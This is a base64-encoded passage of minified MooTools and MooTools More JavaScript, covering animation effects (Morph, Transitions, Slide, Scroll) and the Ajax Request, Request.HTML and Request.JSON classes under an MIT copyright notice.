cmVhaztkZWZhdWx0OkUuc3RhcnQoRCxhcmd1bWVudHMpO31pZighQSl7dGhpcy5lbGltaW5hdGUoImZhZGU6ZmxhZyIpO31yZXR1cm4gdGhpczt9LGhpZ2hsaWdodDpmdW5jdGlvbihDLEEpe2lmKCFBKXtBPXRoaXMucmV0cmlldmUoImhpZ2hsaWdodDpvcmlnaW5hbCIsdGhpcy5nZXRTdHlsZSgiYmFja2dyb3VuZC1jb2xvciIpKTsKQT0oQT09InRyYW5zcGFyZW50Iik/IiNmZmYiOkE7fXZhciBCPXRoaXMuZ2V0KCJ0d2VlbiIpO0Iuc3RhcnQoImJhY2tncm91bmQtY29sb3IiLEN8fCIjZmZmZjg4IixBKS5jaGFpbihmdW5jdGlvbigpe3RoaXMuc2V0U3R5bGUoImJhY2tncm91bmQtY29sb3IiLHRoaXMucmV0cmlldmUoImhpZ2hsaWdodDpvcmlnaW5hbCIpKTsKQi5jYWxsQ2hhaW4oKTt9LmJpbmQodGhpcykpO3JldHVybiB0aGlzO319KTtGeC5Nb3JwaD1uZXcgQ2xhc3Moe0V4dGVuZHM6RnguQ1NTLGluaXRpYWxpemU6ZnVuY3Rpb24oQixBKXt0aGlzLmVsZW1lbnQ9dGhpcy5zdWJqZWN0PSQoQik7dGhpcy5wYXJlbnQoQSk7fSxzZXQ6ZnVuY3Rpb24oQSl7aWYodHlwZW9mIEE9PSJzdHJpbmciKXtBPXRoaXMuc2VhcmNoKEEpOwp9Zm9yKHZhciBCIGluIEEpe3RoaXMucmVuZGVyKHRoaXMuZWxlbWVudCxCLEFbQl0sdGhpcy5vcHRpb25zLnVuaXQpO31yZXR1cm4gdGhpczt9LGNvbXB1dGU6ZnVuY3Rpb24oRSxELEMpe3ZhciBBPXt9O2Zvcih2YXIgQiBpbiBFKXtBW0JdPXRoaXMucGFyZW50KEVbQl0sRFtCXSxDKTsKfXJldHVybiBBO30sc3RhcnQ6ZnVuY3Rpb24oQil7aWYoIXRoaXMuY2hlY2soYXJndW1lbnRzLmNhbGxlZSxCKSl7cmV0dXJuIHRoaXM7fWlmKHR5cGVvZiBCPT0ic3RyaW5nIil7Qj10aGlzLnNlYXJjaChCKTt9dmFyIEU9e30sRD17fTtmb3IodmFyIEMgaW4gQil7dmFyIEE9dGhpcy5wcmVwYXJlKHRoaXMuZWxlbWVudCxDLEJbQ10pOwpFW0NdPUEuZnJvbTtEW0NdPUEudG87fXJldHVybiB0aGlzLnBhcmVudChFLEQpO319KTtFbGVtZW50LlByb3BlcnRpZXMubW9ycGg9e3NldDpmdW5jdGlvbihBKXt2YXIgQj10aGlzLnJldHJpZXZlKCJtb3JwaCIpO2lmKEIpe0IuY2FuY2VsKCk7fXJldHVybiB0aGlzLmVsaW1pbmF0ZSgibW9ycGgiKS5zdG9yZSgibW9ycGg6b3B0aW9ucyIsJGV4dGVuZCh7bGluazoiY2FuY2VsIn0sQSkpOwp9LGdldDpmdW5jdGlvbihBKXtpZihBfHwhdGhpcy5yZXRyaWV2ZSgibW9ycGgiKSl7aWYoQXx8IXRoaXMucmV0cmlldmUoIm1vcnBoOm9wdGlvbnMiKSl7dGhpcy5zZXQoIm1vcnBoIixBKTt9dGhpcy5zdG9yZSgibW9ycGgiLG5ldyBGeC5Nb3JwaCh0aGlzLHRoaXMucmV0cmlldmUoIm1vcnBoOm9wdGlvbnMiKSkpOwp9cmV0dXJuIHRoaXMucmV0cmlldmUoIm1vcnBoIik7fX07RWxlbWVudC5pbXBsZW1lbnQoe21vcnBoOmZ1bmN0aW9uKEEpe3RoaXMuZ2V0KCJtb3JwaCIpLnN0YXJ0KEEpO3JldHVybiB0aGlzO319KTsoZnVuY3Rpb24oKXt2YXIgQT1GeC5wcm90b3R5cGUuaW5pdGlhbGl6ZTsKRngucHJvdG90eXBlLmluaXRpYWxpemU9ZnVuY3Rpb24oQil7QS5jYWxsKHRoaXMsQik7dmFyIEM9dGhpcy5vcHRpb25zLnRyYW5zaXRpb247aWYodHlwZW9mIEM9PSJzdHJpbmciJiYoQz1DLnNwbGl0KCI6IikpKXt2YXIgRD1GeC5UcmFuc2l0aW9ucztEPURbQ1swXV18fERbQ1swXS5jYXBpdGFsaXplKCldOwppZihDWzFdKXtEPURbImVhc2UiK0NbMV0uY2FwaXRhbGl6ZSgpKyhDWzJdP0NbMl0uY2FwaXRhbGl6ZSgpOiIiKV07fXRoaXMub3B0aW9ucy50cmFuc2l0aW9uPUQ7fX07fSkoKTtGeC5UcmFuc2l0aW9uPWZ1bmN0aW9uKEIsQSl7QT0kc3BsYXQoQSk7cmV0dXJuICRleHRlbmQoQix7ZWFzZUluOmZ1bmN0aW9uKEMpe3JldHVybiBCKEMsQSk7Cn0sZWFzZU91dDpmdW5jdGlvbihDKXtyZXR1cm4gMS1CKDEtQyxBKTt9LGVhc2VJbk91dDpmdW5jdGlvbihDKXtyZXR1cm4oQzw9MC41KT9CKDIqQyxBKS8yOigyLUIoMiooMS1DKSxBKSkvMjt9fSk7fTtGeC5UcmFuc2l0aW9ucz1uZXcgSGFzaCh7bGluZWFyOiRhcmd1bWVudHMoMCl9KTsKRnguVHJhbnNpdGlvbnMuZXh0ZW5kPWZ1bmN0aW9uKEEpe2Zvcih2YXIgQiBpbiBBKXtGeC5UcmFuc2l0aW9uc1tCXT1uZXcgRnguVHJhbnNpdGlvbihBW0JdKTt9fTtGeC5UcmFuc2l0aW9ucy5leHRlbmQoe1BvdzpmdW5jdGlvbihCLEEpe3JldHVybiBNYXRoLnBvdyhCLEFbMF18fDYpOwp9LEV4cG86ZnVuY3Rpb24oQSl7cmV0dXJuIE1hdGgucG93KDIsOCooQS0xKSk7fSxDaXJjOmZ1bmN0aW9uKEEpe3JldHVybiAxLU1hdGguc2luKE1hdGguYWNvcyhBKSk7fSxTaW5lOmZ1bmN0aW9uKEEpe3JldHVybiAxLU1hdGguc2luKCgxLUEpKk1hdGguUEkvMik7Cn0sQmFjazpmdW5jdGlvbihCLEEpe0E9QVswXXx8MS42MTg7cmV0dXJuIE1hdGgucG93KEIsMikqKChBKzEpKkItQSk7fSxCb3VuY2U6ZnVuY3Rpb24oRCl7dmFyIEM7Zm9yKHZhciBCPTAsQT0xOzE7Qis9QSxBLz0yKXtpZihEPj0oNy00KkIpLzExKXtDPS1NYXRoLnBvdygoMTEtNipCLTExKkQpLzQsMikrQSpBOwpicmVhazt9fXJldHVybiBDO30sRWxhc3RpYzpmdW5jdGlvbihCLEEpe3JldHVybiBNYXRoLnBvdygyLDEwKi0tQikqTWF0aC5jb3MoMjAqQipNYXRoLlBJKihBWzBdfHwxKS8zKTt9fSk7WyJRdWFkIiwiQ3ViaWMiLCJRdWFydCIsIlF1aW50Il0uZWFjaChmdW5jdGlvbihCLEEpe0Z4LlRyYW5zaXRpb25zW0JdPW5ldyBGeC5UcmFuc2l0aW9uKGZ1bmN0aW9uKEMpe3JldHVybiBNYXRoLnBvdyhDLFtBKzJdKTsKfSk7fSk7dmFyIFJlcXVlc3Q9bmV3IENsYXNzKHtJbXBsZW1lbnRzOltDaGFpbixFdmVudHMsT3B0aW9uc10sb3B0aW9uczp7dXJsOiIiLGRhdGE6IiIsaGVhZGVyczp7IlgtUmVxdWVzdGVkLVdpdGgiOiJYTUxIdHRwUmVxdWVzdCIsQWNjZXB0OiJ0ZXh0L2phdmFzY3JpcHQsIHRleHQvaHRtbCwgYXBwbGljYXRpb24veG1sLCB0ZXh0L3htbCwgKi8qIn0sYXN5bmM6dHJ1ZSxmb3JtYXQ6ZmFsc2UsbWV0aG9kOiJwb3N0IixsaW5rOiJpZ25vcmUiLGlzU3VjY2VzczpudWxsLGVtdWxhdGlvbjp0cnVlLHVybEVuY29kZWQ6dHJ1ZSxlbmNvZGluZzoidXRmLTgiLGV2YWxTY3JpcHRzOmZhbHNlLGV2YWxSZXNwb25zZTpmYWxzZX0saW5pdGlhbGl6ZTpmdW5jdGlvbihBKXt0aGlzLnhocj1uZXcgQnJvd3Nlci5SZXF1ZXN0KCk7CnRoaXMuc2V0T3B0aW9ucyhBKTt0aGlzLm9wdGlvbnMuaXNTdWNjZXNzPXRoaXMub3B0aW9ucy5pc1N1Y2Nlc3N8fHRoaXMuaXNTdWNjZXNzO3RoaXMuaGVhZGVycz1uZXcgSGFzaCh0aGlzLm9wdGlvbnMuaGVhZGVycyk7fSxvblN0YXRlQ2hhbmdlOmZ1bmN0aW9uKCl7aWYodGhpcy54aHIucmVhZHlTdGF0ZSE9NHx8IXRoaXMucnVubmluZyl7cmV0dXJuIDsKfXRoaXMucnVubmluZz1mYWxzZTt0aGlzLnN0YXR1cz0wOyR0cnkoZnVuY3Rpb24oKXt0aGlzLnN0YXR1cz10aGlzLnhoci5zdGF0dXM7fS5iaW5kKHRoaXMpKTtpZih0aGlzLm9wdGlvbnMuaXNTdWNjZXNzLmNhbGwodGhpcyx0aGlzLnN0YXR1cykpe3RoaXMucmVzcG9uc2U9e3RleHQ6dGhpcy54aHIucmVzcG9uc2VUZXh0LHhtbDp0aGlzLnhoci5yZXNwb25zZVhNTH07CnRoaXMuc3VjY2Vzcyh0aGlzLnJlc3BvbnNlLnRleHQsdGhpcy5yZXNwb25zZS54bWwpO31lbHNle3RoaXMucmVzcG9uc2U9e3RleHQ6bnVsbCx4bWw6bnVsbH07dGhpcy5mYWlsdXJlKCk7fXRoaXMueGhyLm9ucmVhZHlzdGF0ZWNoYW5nZT0kZW1wdHk7fSxpc1N1Y2Nlc3M6ZnVuY3Rpb24oKXtyZXR1cm4oKHRoaXMuc3RhdHVzPj0yMDApJiYodGhpcy5zdGF0dXM8MzAwKSk7Cn0scHJvY2Vzc1NjcmlwdHM6ZnVuY3Rpb24oQSl7aWYodGhpcy5vcHRpb25zLmV2YWxSZXNwb25zZXx8KC8oZWNtYXxqYXZhKXNjcmlwdC8pLnRlc3QodGhpcy5nZXRIZWFkZXIoIkNvbnRlbnQtdHlwZSIpKSl7cmV0dXJuICRleGVjKEEpO31yZXR1cm4gQS5zdHJpcFNjcmlwdHModGhpcy5vcHRpb25zLmV2YWxTY3JpcHRzKTsKfSxzdWNjZXNzOmZ1bmN0aW9uKEIsQSl7dGhpcy5vblN1Y2Nlc3ModGhpcy5wcm9jZXNzU2NyaXB0cyhCKSxBKTt9LG9uU3VjY2VzczpmdW5jdGlvbigpe3RoaXMuZmlyZUV2ZW50KCJjb21wbGV0ZSIsYXJndW1lbnRzKS5maXJlRXZlbnQoInN1Y2Nlc3MiLGFyZ3VtZW50cykuY2FsbENoYWluKCk7Cn0sZmFpbHVyZTpmdW5jdGlvbigpe3RoaXMub25GYWlsdXJlKCk7fSxvbkZhaWx1cmU6ZnVuY3Rpb24oKXt0aGlzLmZpcmVFdmVudCgiY29tcGxldGUiKS5maXJlRXZlbnQoImZhaWx1cmUiLHRoaXMueGhyKTt9LHNldEhlYWRlcjpmdW5jdGlvbihBLEIpe3RoaXMuaGVhZGVycy5zZXQoQSxCKTsKcmV0dXJuIHRoaXM7fSxnZXRIZWFkZXI6ZnVuY3Rpb24oQSl7cmV0dXJuICR0cnkoZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy54aHIuZ2V0UmVzcG9uc2VIZWFkZXIoQSk7fS5iaW5kKHRoaXMpKTt9LGNoZWNrOmZ1bmN0aW9uKEEpe2lmKCF0aGlzLnJ1bm5pbmcpe3JldHVybiB0cnVlOwp9c3dpdGNoKHRoaXMub3B0aW9ucy5saW5rKXtjYXNlImNhbmNlbCI6dGhpcy5jYW5jZWwoKTtyZXR1cm4gdHJ1ZTtjYXNlImNoYWluIjp0aGlzLmNoYWluKEEuYmluZCh0aGlzLEFycmF5LnNsaWNlKGFyZ3VtZW50cywxKSkpO3JldHVybiBmYWxzZTt9cmV0dXJuIGZhbHNlOwp9LHNlbmQ6ZnVuY3Rpb24oSSl7aWYoIXRoaXMuY2hlY2soYXJndW1lbnRzLmNhbGxlZSxJKSl7cmV0dXJuIHRoaXM7fXRoaXMucnVubmluZz10cnVlO3ZhciBHPSR0eXBlKEkpO2lmKEc9PSJzdHJpbmcifHxHPT0iZWxlbWVudCIpe0k9e2RhdGE6SX07fXZhciBEPXRoaXMub3B0aW9uczsKST0kZXh0ZW5kKHtkYXRhOkQuZGF0YSx1cmw6RC51cmwsbWV0aG9kOkQubWV0aG9kfSxJKTt2YXIgRT1JLmRhdGEsQj1JLnVybCxBPUkubWV0aG9kO3N3aXRjaCgkdHlwZShFKSl7Y2FzZSJlbGVtZW50IjpFPSQoRSkudG9RdWVyeVN0cmluZygpO2JyZWFrO2Nhc2Uib2JqZWN0IjpjYXNlImhhc2giOkU9SGFzaC50b1F1ZXJ5U3RyaW5nKEUpOwp9aWYodGhpcy5vcHRpb25zLmZvcm1hdCl7dmFyIEg9ImZvcm1hdD0iK3RoaXMub3B0aW9ucy5mb3JtYXQ7RT0oRSk/SCsiJiIrRTpIO31pZih0aGlzLm9wdGlvbnMuZW11bGF0aW9uJiZbInB1dCIsImRlbGV0ZSJdLmNvbnRhaW5zKEEpKXt2YXIgRj0iX21ldGhvZD0iK0E7CkU9KEUpP0YrIiYiK0U6RjtBPSJwb3N0Ijt9aWYodGhpcy5vcHRpb25zLnVybEVuY29kZWQmJkE9PSJwb3N0Iil7dmFyIEM9KHRoaXMub3B0aW9ucy5lbmNvZGluZyk/IjsgY2hhcnNldD0iK3RoaXMub3B0aW9ucy5lbmNvZGluZzoiIjt0aGlzLmhlYWRlcnMuc2V0KCJDb250ZW50LXR5cGUiLCJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiK0MpOwp9aWYoRSYmQT09ImdldCIpe0I9QisoQi5jb250YWlucygiPyIpPyImIjoiPyIpK0U7RT1udWxsO310aGlzLnhoci5vcGVuKEEudG9VcHBlckNhc2UoKSxCLHRoaXMub3B0aW9ucy5hc3luYyk7dGhpcy54aHIub25yZWFkeXN0YXRlY2hhbmdlPXRoaXMub25TdGF0ZUNoYW5nZS5iaW5kKHRoaXMpOwp0aGlzLmhlYWRlcnMuZWFjaChmdW5jdGlvbihLLEope2lmKCEkdHJ5KGZ1bmN0aW9uKCl7dGhpcy54aHIuc2V0UmVxdWVzdEhlYWRlcihKLEspO3JldHVybiB0cnVlO30uYmluZCh0aGlzKSkpe3RoaXMuZmlyZUV2ZW50KCJleGNlcHRpb24iLFtKLEtdKTt9fSx0aGlzKTsKdGhpcy5maXJlRXZlbnQoInJlcXVlc3QiKTt0aGlzLnhoci5zZW5kKEUpO2lmKCF0aGlzLm9wdGlvbnMuYXN5bmMpe3RoaXMub25TdGF0ZUNoYW5nZSgpO31yZXR1cm4gdGhpczt9LGNhbmNlbDpmdW5jdGlvbigpe2lmKCF0aGlzLnJ1bm5pbmcpe3JldHVybiB0aGlzOwp9dGhpcy5ydW5uaW5nPWZhbHNlO3RoaXMueGhyLmFib3J0KCk7dGhpcy54aHIub25yZWFkeXN0YXRlY2hhbmdlPSRlbXB0eTt0aGlzLnhocj1uZXcgQnJvd3Nlci5SZXF1ZXN0KCk7dGhpcy5maXJlRXZlbnQoImNhbmNlbCIpO3JldHVybiB0aGlzO319KTsoZnVuY3Rpb24oKXt2YXIgQT17fTsKWyJnZXQiLCJwb3N0IiwicHV0IiwiZGVsZXRlIiwiR0VUIiwiUE9TVCIsIlBVVCIsIkRFTEVURSJdLmVhY2goZnVuY3Rpb24oQil7QVtCXT1mdW5jdGlvbigpe3ZhciBDPUFycmF5LmxpbmsoYXJndW1lbnRzLHt1cmw6U3RyaW5nLnR5cGUsZGF0YTokZGVmaW5lZH0pOwpyZXR1cm4gdGhpcy5zZW5kKCRleHRlbmQoQyx7bWV0aG9kOkIudG9Mb3dlckNhc2UoKX0pKTt9O30pO1JlcXVlc3QuaW1wbGVtZW50KEEpO30pKCk7RWxlbWVudC5Qcm9wZXJ0aWVzLnNlbmQ9e3NldDpmdW5jdGlvbihBKXt2YXIgQj10aGlzLnJldHJpZXZlKCJzZW5kIik7CmlmKEIpe0IuY2FuY2VsKCk7fXJldHVybiB0aGlzLmVsaW1pbmF0ZSgic2VuZCIpLnN0b3JlKCJzZW5kOm9wdGlvbnMiLCRleHRlbmQoe2RhdGE6dGhpcyxsaW5rOiJjYW5jZWwiLG1ldGhvZDp0aGlzLmdldCgibWV0aG9kIil8fCJwb3N0Iix1cmw6dGhpcy5nZXQoImFjdGlvbiIpfSxBKSk7Cn0sZ2V0OmZ1bmN0aW9uKEEpe2lmKEF8fCF0aGlzLnJldHJpZXZlKCJzZW5kIikpe2lmKEF8fCF0aGlzLnJldHJpZXZlKCJzZW5kOm9wdGlvbnMiKSl7dGhpcy5zZXQoInNlbmQiLEEpO310aGlzLnN0b3JlKCJzZW5kIixuZXcgUmVxdWVzdCh0aGlzLnJldHJpZXZlKCJzZW5kOm9wdGlvbnMiKSkpOwp9cmV0dXJuIHRoaXMucmV0cmlldmUoInNlbmQiKTt9fTtFbGVtZW50LmltcGxlbWVudCh7c2VuZDpmdW5jdGlvbihBKXt2YXIgQj10aGlzLmdldCgic2VuZCIpO0Iuc2VuZCh7ZGF0YTp0aGlzLHVybDpBfHxCLm9wdGlvbnMudXJsfSk7cmV0dXJuIHRoaXM7fX0pO1JlcXVlc3QuSFRNTD1uZXcgQ2xhc3Moe0V4dGVuZHM6UmVxdWVzdCxvcHRpb25zOnt1cGRhdGU6ZmFsc2UsZXZhbFNjcmlwdHM6dHJ1ZSxmaWx0ZXI6ZmFsc2V9LHByb2Nlc3NIVE1MOmZ1bmN0aW9uKEMpe3ZhciBCPUMubWF0Y2goLzxib2R5W14+XSo+KFtcc1xTXSo/KTxcL2JvZHk+L2kpOwpDPShCKT9CWzFdOkM7dmFyIEE9bmV3IEVsZW1lbnQoImRpdiIpO3JldHVybiAkdHJ5KGZ1bmN0aW9uKCl7dmFyIEQ9Ijxyb290PiIrQysiPC9yb290PiIsRztpZihCcm93c2VyLkVuZ2luZS50cmlkZW50KXtHPW5ldyBBY3RpdmVYT2JqZWN0KCJNaWNyb3NvZnQuWE1MRE9NIik7CkcuYXN5bmM9ZmFsc2U7Ry5sb2FkWE1MKEQpO31lbHNle0c9bmV3IERPTVBhcnNlcigpLnBhcnNlRnJvbVN0cmluZyhELCJ0ZXh0L3htbCIpO31EPUcuZ2V0RWxlbWVudHNCeVRhZ05hbWUoInJvb3QiKVswXTtmb3IodmFyIEY9MCxFPUQuY2hpbGROb2Rlcy5sZW5ndGg7CkY8RTtGKyspe3ZhciBIPUVsZW1lbnQuY2xvbmUoRC5jaGlsZE5vZGVzW0ZdLHRydWUsdHJ1ZSk7aWYoSCl7QS5ncmFiKEgpO319cmV0dXJuIEE7fSl8fEEuc2V0KCJodG1sIixDKTt9LHN1Y2Nlc3M6ZnVuY3Rpb24oRCl7dmFyIEM9dGhpcy5vcHRpb25zLEI9dGhpcy5yZXNwb25zZTsKQi5odG1sPUQuc3RyaXBTY3JpcHRzKGZ1bmN0aW9uKEUpe0IuamF2YXNjcmlwdD1FO30pO3ZhciBBPXRoaXMucHJvY2Vzc0hUTUwoQi5odG1sKTtCLnRyZWU9QS5jaGlsZE5vZGVzO0IuZWxlbWVudHM9QS5nZXRFbGVtZW50cygiKiIpO2lmKEMuZmlsdGVyKXtCLnRyZWU9Qi5lbGVtZW50cy5maWx0ZXIoQy5maWx0ZXIpOwp9aWYoQy51cGRhdGUpeyQoQy51cGRhdGUpLmVtcHR5KCkuYWRvcHQoQi50cmVlKTt9aWYoQy5ldmFsU2NyaXB0cyl7JGV4ZWMoQi5qYXZhc2NyaXB0KTt9dGhpcy5vblN1Y2Nlc3MoQi50cmVlLEIuZWxlbWVudHMsQi5odG1sLEIuamF2YXNjcmlwdCk7fX0pO0VsZW1lbnQuUHJvcGVydGllcy5sb2FkPXtzZXQ6ZnVuY3Rpb24oQSl7dmFyIEI9dGhpcy5yZXRyaWV2ZSgibG9hZCIpOwppZihCKXtzZW5kLmNhbmNlbCgpO31yZXR1cm4gdGhpcy5lbGltaW5hdGUoImxvYWQiKS5zdG9yZSgibG9hZDpvcHRpb25zIiwkZXh0ZW5kKHtkYXRhOnRoaXMsbGluazoiY2FuY2VsIix1cGRhdGU6dGhpcyxtZXRob2Q6ImdldCJ9LEEpKTt9LGdldDpmdW5jdGlvbihBKXtpZihBfHwhdGhpcy5yZXRyaWV2ZSgibG9hZCIpKXtpZihBfHwhdGhpcy5yZXRyaWV2ZSgibG9hZDpvcHRpb25zIikpe3RoaXMuc2V0KCJsb2FkIixBKTsKfXRoaXMuc3RvcmUoImxvYWQiLG5ldyBSZXF1ZXN0LkhUTUwodGhpcy5yZXRyaWV2ZSgibG9hZDpvcHRpb25zIikpKTt9cmV0dXJuIHRoaXMucmV0cmlldmUoImxvYWQiKTt9fTtFbGVtZW50LmltcGxlbWVudCh7bG9hZDpmdW5jdGlvbigpe3RoaXMuZ2V0KCJsb2FkIikuc2VuZChBcnJheS5saW5rKGFyZ3VtZW50cyx7ZGF0YTpPYmplY3QudHlwZSx1cmw6U3RyaW5nLnR5cGV9KSk7CnJldHVybiB0aGlzO319KTtSZXF1ZXN0LkpTT049bmV3IENsYXNzKHtFeHRlbmRzOlJlcXVlc3Qsb3B0aW9uczp7c2VjdXJlOnRydWV9LGluaXRpYWxpemU6ZnVuY3Rpb24oQSl7dGhpcy5wYXJlbnQoQSk7dGhpcy5oZWFkZXJzLmV4dGVuZCh7QWNjZXB0OiJhcHBsaWNhdGlvbi9qc29uIiwiWC1SZXF1ZXN0IjoiSlNPTiJ9KTsKfSxzdWNjZXNzOmZ1bmN0aW9uKEEpe3RoaXMucmVzcG9uc2UuanNvbj1KU09OLmRlY29kZShBLHRoaXMub3B0aW9ucy5zZWN1cmUpO3RoaXMub25TdWNjZXNzKHRoaXMucmVzcG9uc2UuanNvbixBKTt9fSk7CgoKLy9Nb29Ub29scyBNb3JlLCA8aHR0cDovL21vb3Rvb2xzLm5ldC9tb3JlPi4gQ29weXJpZ2h0IChjKSAyMDA2LTIwMDggVmFsZXJpbyBQcm9pZXR0aSwgPGh0dHA6Ly9tYWQ0bWlsay5uZXQ+LCBNSVQgU3R5bGUgTGljZW5zZS4KCkZ4LlNsaWRlPW5ldyBDbGFzcyh7RXh0ZW5kczpGeCxvcHRpb25zOnttb2RlOiJ2ZXJ0aWNhbCJ9LGluaXRpYWxpemU6ZnVuY3Rpb24oQixBKXt0aGlzLmFkZEV2ZW50KCJjb21wbGV0ZSIsZnVuY3Rpb24oKXt0aGlzLm9wZW49KHRoaXMud3JhcHBlclsib2Zmc2V0Iit0aGlzLmxheW91dC5jYXBpdGFsaXplKCldIT0wKTsKaWYodGhpcy5vcGVuJiZCcm93c2VyLkVuZ2luZS53ZWJraXQ0MTkpe3RoaXMuZWxlbWVudC5kaXNwb3NlKCkuaW5qZWN0KHRoaXMud3JhcHBlcik7fX0sdHJ1ZSk7dGhpcy5lbGVtZW50PXRoaXMuc3ViamVjdD0kKEIpO3RoaXMucGFyZW50KEEpO3ZhciBDPXRoaXMuZWxlbWVudC5yZXRyaWV2ZSgid3JhcHBlciIpOwp0aGlzLndyYXBwZXI9Q3x8bmV3IEVsZW1lbnQoImRpdiIse3N0eWxlczokZXh0ZW5kKHRoaXMuZWxlbWVudC5nZXRTdHlsZXMoIm1hcmdpbiIsInBvc2l0aW9uIikse292ZXJmbG93OiJoaWRkZW4ifSl9KS53cmFwcyh0aGlzLmVsZW1lbnQpO3RoaXMuZWxlbWVudC5zdG9yZSgid3JhcHBlciIsdGhpcy53cmFwcGVyKS5zZXRTdHlsZSgibWFyZ2luIiwwKTsKdGhpcy5ub3c9W107dGhpcy5vcGVuPXRydWU7fSx2ZXJ0aWNhbDpmdW5jdGlvbigpe3RoaXMubWFyZ2luPSJtYXJnaW4tdG9wIjt0aGlzLmxheW91dD0iaGVpZ2h0Ijt0aGlzLm9mZnNldD10aGlzLmVsZW1lbnQub2Zmc2V0SGVpZ2h0O30saG9yaXpvbnRhbDpmdW5jdGlvbigpe3RoaXMubWFyZ2luPSJtYXJnaW4tbGVmdCI7CnRoaXMubGF5b3V0PSJ3aWR0aCI7dGhpcy5vZmZzZXQ9dGhpcy5lbGVtZW50Lm9mZnNldFdpZHRoO30sc2V0OmZ1bmN0aW9uKEEpe3RoaXMuZWxlbWVudC5zZXRTdHlsZSh0aGlzLm1hcmdpbixBWzBdKTt0aGlzLndyYXBwZXIuc2V0U3R5bGUodGhpcy5sYXlvdXQsQVsxXSk7CnJldHVybiB0aGlzO30sY29tcHV0ZTpmdW5jdGlvbihFLEQsQyl7dmFyIEI9W107dmFyIEE9MjtBLnRpbWVzKGZ1bmN0aW9uKEYpe0JbRl09RnguY29tcHV0ZShFW0ZdLERbRl0sQyk7fSk7cmV0dXJuIEI7fSxzdGFydDpmdW5jdGlvbihCLEUpe2lmKCF0aGlzLmNoZWNrKGFyZ3VtZW50cy5jYWxsZWUsQixFKSl7cmV0dXJuIHRoaXM7Cn10aGlzW0V8fHRoaXMub3B0aW9ucy5tb2RlXSgpO3ZhciBEPXRoaXMuZWxlbWVudC5nZXRTdHlsZSh0aGlzLm1hcmdpbikudG9JbnQoKTt2YXIgQz10aGlzLndyYXBwZXIuZ2V0U3R5bGUodGhpcy5sYXlvdXQpLnRvSW50KCk7dmFyIEE9W1tELENdLFswLHRoaXMub2Zmc2V0XV07CnZhciBHPVtbRCxDXSxbLXRoaXMub2Zmc2V0LDBdXTt2YXIgRjtzd2l0Y2goQil7Y2FzZSJpbiI6Rj1BO2JyZWFrO2Nhc2Uib3V0IjpGPUc7YnJlYWs7Y2FzZSJ0b2dnbGUiOkY9KHRoaXMud3JhcHBlclsib2Zmc2V0Iit0aGlzLmxheW91dC5jYXBpdGFsaXplKCldPT0wKT9BOkc7Cn1yZXR1cm4gdGhpcy5wYXJlbnQoRlswXSxGWzFdKTt9LHNsaWRlSW46ZnVuY3Rpb24oQSl7cmV0dXJuIHRoaXMuc3RhcnQoImluIixBKTt9LHNsaWRlT3V0OmZ1bmN0aW9uKEEpe3JldHVybiB0aGlzLnN0YXJ0KCJvdXQiLEEpO30saGlkZTpmdW5jdGlvbihBKXt0aGlzW0F8fHRoaXMub3B0aW9ucy5tb2RlXSgpOwp0aGlzLm9wZW49ZmFsc2U7cmV0dXJuIHRoaXMuc2V0KFstdGhpcy5vZmZzZXQsMF0pO30sc2hvdzpmdW5jdGlvbihBKXt0aGlzW0F8fHRoaXMub3B0aW9ucy5tb2RlXSgpO3RoaXMub3Blbj10cnVlO3JldHVybiB0aGlzLnNldChbMCx0aGlzLm9mZnNldF0pO30sdG9nZ2xlOmZ1bmN0aW9uKEEpe3JldHVybiB0aGlzLnN0YXJ0KCJ0b2dnbGUiLEEpOwp9fSk7RWxlbWVudC5Qcm9wZXJ0aWVzLnNsaWRlPXtzZXQ6ZnVuY3Rpb24oQil7dmFyIEE9dGhpcy5yZXRyaWV2ZSgic2xpZGUiKTtpZihBKXtBLmNhbmNlbCgpO31yZXR1cm4gdGhpcy5lbGltaW5hdGUoInNsaWRlIikuc3RvcmUoInNsaWRlOm9wdGlvbnMiLCRleHRlbmQoe2xpbms6ImNhbmNlbCJ9LEIpKTsKfSxnZXQ6ZnVuY3Rpb24oQSl7aWYoQXx8IXRoaXMucmV0cmlldmUoInNsaWRlIikpe2lmKEF8fCF0aGlzLnJldHJpZXZlKCJzbGlkZTpvcHRpb25zIikpe3RoaXMuc2V0KCJzbGlkZSIsQSk7fXRoaXMuc3RvcmUoInNsaWRlIixuZXcgRnguU2xpZGUodGhpcyx0aGlzLnJldHJpZXZlKCJzbGlkZTpvcHRpb25zIikpKTsKfXJldHVybiB0aGlzLnJldHJpZXZlKCJzbGlkZSIpO319O0VsZW1lbnQuaW1wbGVtZW50KHtzbGlkZTpmdW5jdGlvbihELEUpe0Q9RHx8InRvZ2dsZSI7dmFyIEI9dGhpcy5nZXQoInNsaWRlIiksQTtzd2l0Y2goRCl7Y2FzZSJoaWRlIjpCLmhpZGUoRSk7YnJlYWs7Y2FzZSJzaG93IjpCLnNob3coRSk7CmJyZWFrO2Nhc2UidG9nZ2xlIjp2YXIgQz10aGlzLnJldHJpZXZlKCJzbGlkZTpmbGFnIixCLm9wZW4pO0JbKEMpPyJzbGlkZU91dCI6InNsaWRlSW4iXShFKTt0aGlzLnN0b3JlKCJzbGlkZTpmbGFnIiwhQyk7QT10cnVlO2JyZWFrO2RlZmF1bHQ6Qi5zdGFydChELEUpOwp9aWYoIUEpe3RoaXMuZWxpbWluYXRlKCJzbGlkZTpmbGFnIik7fXJldHVybiB0aGlzO319KTtGeC5TY3JvbGw9bmV3IENsYXNzKHtFeHRlbmRzOkZ4LG9wdGlvbnM6e29mZnNldDp7eDowLHk6MH0sd2hlZWxTdG9wczp0cnVlfSxpbml0aWFsaXplOmZ1bmN0aW9uKEIsQSl7dGhpcy5lbGVtZW50PXRoaXMuc3ViamVjdD0kKEIpOwp0aGlzLnBhcmVudChBKTt2YXIgRD10aGlzLmNhbmNlbC5iaW5kKHRoaXMsZmFsc2UpO2lmKCR0eXBlKHRoaXMuZWxlbWVudCkhPSJlbGVtZW50Iil7dGhpcy5lbGVtZW50PSQodGhpcy5lbGVtZW50LmdldERvY3VtZW50KCkuYm9keSk7fXZhciBDPXRoaXMuZWxlbWVudDsKaWYodGhpcy5vcHRpb25zLndoZWVsU3RvcHMpe3RoaXMuYWRkRXZlbnQoInN0YXJ0IixmdW5jdGlvbigpe0MuYWRkRXZlbnQoIm1vdXNld2hlZWwiLEQpO30sdHJ1ZSk7dGhpcy5hZGRFdmVudCgiY29tcGxldGUiLGZ1bmN0aW9uKCl7Qy5yZW1vdmVFdmVudCgibW91c2V3aGVlbCIsRCk7Cn0sdHJ1ZSk7fX0sc2V0OmZ1